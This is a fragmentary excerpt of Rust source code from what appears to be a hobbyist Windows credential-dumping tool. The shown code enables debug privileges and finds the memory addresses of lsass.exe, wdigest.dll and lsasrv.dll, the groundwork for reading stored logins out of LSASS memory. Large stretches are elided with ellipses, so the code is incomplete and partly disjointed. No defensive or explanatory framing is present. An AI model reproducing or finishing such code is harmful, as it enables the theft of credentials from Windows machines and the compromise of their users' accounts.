...
// Made by Thotty aka Thanatos for funz. 
            ...
            if res == FALSE {
                ...
                if token_adjust == FALSE {
                    ...
                    if close_handle == FALSE {
                        ...
                        return (true, format!("[!] Trying to enable debug priveleges"));
                    }
                }
            }
        }
...
fn enumerate_lsass_dlls(handle: HANDLE) -> (bool, String) {
    let mut lsass_proces_information: Vec<&str> = Vec::new();
    ...
    for dll_memory in dll_names_address {
        if dll_memory.contains("lsass.exe") {
            let lsass_proces: Vec<&str> = dll_memory.split(":::").collect();
            lsass_proces_information.push(lsass_proces[0]);
            lsass_proces_information.push(lsass_proces[1]);
    ...
    return (true, format!("\n[*] lsass.exe found at: {}\n\r[*] wdigest.dll found at: {}\n\r[*] lsasrv.dll found at: {}\n\r", lsass_proces_information[1], wdigest_dll_information[1], lsasrv_dll_information[1]));
}
